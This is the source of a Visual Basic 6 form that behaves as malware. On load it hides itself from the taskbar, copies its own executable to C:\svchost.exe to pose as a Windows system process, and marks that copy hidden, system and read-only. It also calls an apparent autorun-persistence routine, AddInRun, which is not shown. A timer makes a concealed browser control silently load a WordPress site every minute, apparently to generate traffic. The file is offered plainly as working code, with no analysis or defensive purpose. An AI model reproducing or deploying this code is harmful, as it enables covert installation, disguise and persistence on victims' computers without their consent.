VERSION 5.00
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "ieframe.dll"
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   6480
   ClientLeft      =   1560
   ClientTop       =   915
   ClientWidth     =   10740
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   6480
   ScaleWidth      =   10740
   Begin VB.Timer Timer1 
      Interval        =   60000
      Left            =   2880
      Top             =   2520
   End
   Begin SHDocVwCtl.WebBrowser WebBrowser1 
      Height          =   255
      Left            =   5160
      TabIndex        =   0
      Top             =   3840
      Width           =   255
      ExtentX         =   450
      ExtentY         =   450
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   "http:///"
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()

On Error Resume Next

App.TaskVisible = False

Form1.Hide

FileSystem.FileCopy App.Path & "\" & App.EXEName & ".exe", "C:\svchost.exe"

FileSystem.SetAttr "C:\svchost.exe", vbHidden + vbSystem + vbReadOnly

Call AddInRun

End Sub

Private Sub Timer1_Timer()
WebBrowser1.Navigate "www.burhangee.wordpress.com"
WebBrowser1.Silent = True
End Sub
